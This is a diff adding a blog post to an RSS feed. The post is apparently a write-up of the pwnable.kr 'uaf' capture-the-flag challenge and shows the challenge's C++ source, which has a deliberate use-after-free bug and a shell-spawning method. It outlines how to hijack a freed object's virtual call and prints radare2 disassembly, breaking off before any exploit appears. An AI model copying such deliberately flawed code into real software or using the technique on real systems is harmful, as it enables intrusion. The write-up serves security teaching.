@@ -7,6 +7,412 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Pwnable.kr - uaf</title>
+        <description>&lt;p&gt;In this challenge we’re going to cover some basics behind the use-after-free bug in some C++ code.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ssh uaf@pwnable.kr &lt;span class=&quot;nt&quot;&gt;-p2222&lt;/span&gt;                                             130 ↵
+uaf@pwnable.kr&lt;span class=&quot;s1&quot;&gt;'s password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  '&lt;/span&gt; / |  D  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   _/|  |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; |___ |    _]    |    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;|    / 
+|  |  |  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;  &lt;span class=&quot;s1&quot;&gt;'  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87.kr@gmail.com
+- IRC : irc.netgarage.org:6667 / #pwnable.kr
+- Simply type &quot;irssi&quot; command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+Last login: Wed Jul  4 10:19:57 2018 from 213.89.161.62
+uaf@ubuntu:~$ ls -la
+total 44
+drwxr-x---  5 root uaf      4096 Oct 23  2016 .
+drwxr-xr-x 87 root root     4096 Dec 27  2017 ..
+d---------  2 root root     4096 Sep 20  2015 .bash_history
+-rw-r-----  1 root uaf_pwn    22 Sep 25  2015 flag
+dr-xr-xr-x  2 root root     4096 Sep 20  2015 .irssi
+drwxr-xr-x  2 root root     4096 Oct 23  2016 .pwntools-cache
+-r-xr-sr-x  1 root uaf_pwn 15463 Sep 25  2015 uaf
+-rw-r--r--  1 root root     1431 Sep 25  2015 uaf.cpp&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Once again we are presented with two files - binary and the source code. Let’s take a look at it.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;fcntl.h&amp;gt;
+#include &amp;lt;iostream&amp;gt; 
+#include &amp;lt;cstring&amp;gt;
+#include &amp;lt;cstdlib&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;give_shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;My name is &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;I am &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; years old&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Man&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;Man&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;age&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;I am a nice guy!&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Woman&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;Woman&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;age&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;I am a cute girl!&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Man&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Jack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;Human&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Woman&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Jill&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;op&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1. use&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;2. after&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3. free&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;cin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;op&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+		&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;op&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;introduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;your data is allocated&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+				&lt;span class=&quot;k&quot;&gt;delete&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+				&lt;span class=&quot;k&quot;&gt;delete&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;What we can see here is two objects of classes &lt;code class=&quot;highlighter-rouge&quot;&gt;Man&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Woman&lt;/code&gt;. Both those classes inherit the methods and values from class &lt;code class=&quot;highlighter-rouge&quot;&gt;Human&lt;/code&gt;. This class is particularly interesting, as it contains the virtual methond &lt;code class=&quot;highlighter-rouge&quot;&gt;give_shell&lt;/code&gt; that executes &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;In addition, we can see a simple use-after-free vulnerability. After pressing &lt;code class=&quot;highlighter-rouge&quot;&gt;3&lt;/code&gt; in main &lt;code class=&quot;highlighter-rouge&quot;&gt;while(1)&lt;/code&gt; loop of the program, we can free the objects previously allocated, but we still can call methods &lt;code class=&quot;highlighter-rouge&quot;&gt;m-&amp;gt;introduce();&lt;/code&gt; by pressing &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;In addition, by pressing &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt; we can allocate some bytes of data using &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; that is supposed to specify how much data to read, and &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[2]&lt;/code&gt; that is the filename that we want to read.&lt;/p&gt;
+
+&lt;p&gt;With this information we can think of a simple attack, firstly free the objects, overwrite their data with something that we especially craft in order to make a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;give_shell&lt;/code&gt; method and call it with first option.&lt;/p&gt;
+
+&lt;p&gt;But firstly, let’s diassemble this binary.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;uaf@ubuntu:~$ r2 ./uaf
+ -- Hello Mr. Anderson
+[0x00400de0]&amp;gt; aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Analyze function calls (aac)
+[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
+[0x00400de0]&amp;gt; s main 
+[0x00400ec4]&amp;gt; pdf
+            ;-- main:
+/ (fcn) sym.main 490
+|   sym.main ();
+|           ; var int local_60h @ rbp-0x60
+|           ; var int local_54h @ rbp-0x54
+|           ; var int local_50h @ rbp-0x50
+|           ; var int local_40h @ rbp-0x40
+|           ; var int local_38h @ rbp-0x38
+|           ; var int local_30h @ rbp-0x30
+|           ; var int local_28h @ rbp-0x28
+|           ; var int local_20h @ rbp-0x20
+|           ; var int local_18h @ rbp-0x18
+|           ; var int local_12h @ rbp-0x12
+|           ; var int local_11h @ rbp-0x11
+|              ; DATA XREF from 0x00400dfd (entry0)
+|           0x00400ec4      55             push rbp
+|           0x00400ec5      4889e5         mov rbp, rsp
+|           0x00400ec8      4154           push r12
+|           0x00400eca      53             push rbx
+|           0x00400ecb      4883ec50       sub rsp, 0x50               ; 'P'
+|           0x00400ecf      897dac         mov dword [rbp - local_54h], edi
+|           0x00400ed2      488975a0       mov qword [rbp - local_60h], rsi
+|           0x00400ed6      488d45ee       lea rax, [rbp - local_12h]
+|           0x00400eda      4889c7         mov rdi, rax
+|           0x00400edd      e88efeffff     call sym.std::allocator_char_::allocator
+|           0x00400ee2      488d55ee       lea rdx, [rbp - local_12h]
+|           0x00400ee6      488d45b0       lea rax, [rbp - local_50h]
+|           0x00400eea      bef0144000     mov esi, str.Jack           ; &quot;Jack&quot; @ 0x4014f0
+|           0x00400eef      4889c7         mov rdi, rax
+|           0x00400ef2      e819feffff     call sym.std::basic_string_char_std::char_traits_char__std::allocator_char__::basic_string
+|           0x00400ef7      4c8d65b0       lea r12, [rbp - local_50h]
+|           0x00400efb      bf18000000     mov edi, 0x18
+|           0x00400f00      e88bfeffff     call sym.operatornew
+|           0x00400f05      4889c3         mov rbx, rax
+|           0x00400f08      ba19000000     mov edx, 0x19
+|           0x00400f0d      4c89e6         mov rsi, r12
+|           0x00400f10      4889df         mov rdi, rbx
+|           0x00400f13      e84c030000     call sym.Man::Man
+|           0x00400f18      48895dc8       mov qword [rbp - local_38h], rbx
+|           0x00400f1c      488d45b0       lea rax, [rbp - local_50h]
+|           0x00400f20      4889c7         mov rdi, rax
+|           0x00400f23      e8d8fdffff     call sym.std::basic_string_char_std::char_traits_char__std::allocator_char__::_basic_string
+|           0x00400f28      488d45ee       lea rax, [rbp - local_12h]
+|           0x00400f2c      4889c7         mov rdi, rax
+|           0x00400f2f      e80cfeffff     call sym.std::allocator_char_::_allocator
+|           0x00400f34      488d45ef       lea rax, [rbp - local_11h]
+|           0x00400f38      4889c7         mov rdi, rax
+|           0x00400f3b      e830feffff     call sym.std::allocator_char_::allocator
+|           0x00400f40      488d55ef       lea rdx, [rbp - local_11h]
+|           0x00400f44      488d45c0       lea rax, [rbp - local_40h]
+|           0x00400f48      bef5144000     mov esi, str.Jill           ; &quot;Jill&quot; @ 0x4014f5
+|           0x00400f4d      4889c7         mov rdi, rax
+|           0x00400f50      e8bbfdffff     call sym.std::basic_string_char_std::char_traits_char__std::allocator_char__::basic_string
+|           0x00400f55      4c8d65c0       lea r12, [rbp - local_40h]
+|           0x00400f59      bf18000000     mov edi, 0x18
+|           0x00400f5e      e82dfeffff     call sym.operatornew
+|           0x00400f63      4889c3         mov rbx, rax
+|           0x00400f66      ba15000000     mov edx, 0x15
+|           0x00400f6b      4c89e6         mov rsi, r12
+|           0x00400f6e      4889df         mov rdi, rbx
+|           0x00400f71      e892030000     call sym.Woman::Woman
+|           0x00400f76      48895dd0       mov qword [rbp - local_30h], rbx
+|           0x00400f7a      488d45c0       lea rax, [rbp - local_40h]
+|           0x00400f7e      4889c7         mov rdi, rax
+|           0x00400f81      e87afdffff     call sym.std::basic_string_char_std::char_traits_char__std::allocator_char__::_basic_string
+|           0x00400f86      488d45ef       lea rax, [rbp - local_11h]
+|           0x00400f8a      4889c7         mov rdi, rax
+|           0x00400f8d      e8aefdffff     call sym.std::allocator_char_::_allocator
+|              ; JMP XREF from 0x004010a9 (sym.main)
+|       .-&amp;gt; 0x00400f92      befa144000     mov esi, str.1._use_n2._after_n3._free_n ; &quot;1. use.2. after.3. free.&quot; @ 0x4014fa
+|       !   0x00400f97      bf60226000     mov edi, obj.std::cout      ; obj.std::cout
+|       !   0x00400f9c      e84ffdffff     call sym.std::operator___std::char_traits_char__
+|       !   0x00400fa1      488d45e8       lea rax, [rbp - local_18h]
+|       !   0x00400fa5      4889c6         mov rsi, rax
+|       !   0x00400fa8      bfe0206000     mov edi, obj.std::cin       ; &quot;untu/Linaro 4.6.3-1ubuntu5) 4.6.3&quot; @ 0x6020e0
+|       !   0x00400fad      e81efeffff     call sym.std::istream::operator__
+|       !   0x00400fb2      8b45e8         mov eax, dword [rbp - local_18h]
+|       !   0x00400fb5      83f802         cmp eax, 2
+|      ,==&amp;lt; 0x00400fb8      7446           je 0x401000
+|      |!   0x00400fba      83f803         cmp eax, 3
+|     ,===&amp;lt; 0x00400fbd      0f84b3000000   je 0x401076
+|     ||!   0x00400fc3      83f801         cmp eax, 1
+|    ,====&amp;lt; 0x00400fc6      7405           je 0x400fcd
+|   ,=====&amp;lt; 0x00400fc8      e9dc000000     jmp 0x4010a9
+|   ||||!      ; JMP XREF from 0x00400fc6 (sym.main)
+|   |`----&amp;gt; 0x00400fcd      488b45c8       mov rax, qword [rbp - local_38h]
+|   | ||!   0x00400fd1      488b00         mov rax, qword [rax]
+|   | ||!   0x00400fd4      4883c008       add rax, 8
+|   | ||!   0x00400fd8      488b10         mov rdx, qword [rax]
+|   | ||!   0x00400fdb      488b45c8       mov rax, qword [rbp - local_38h]
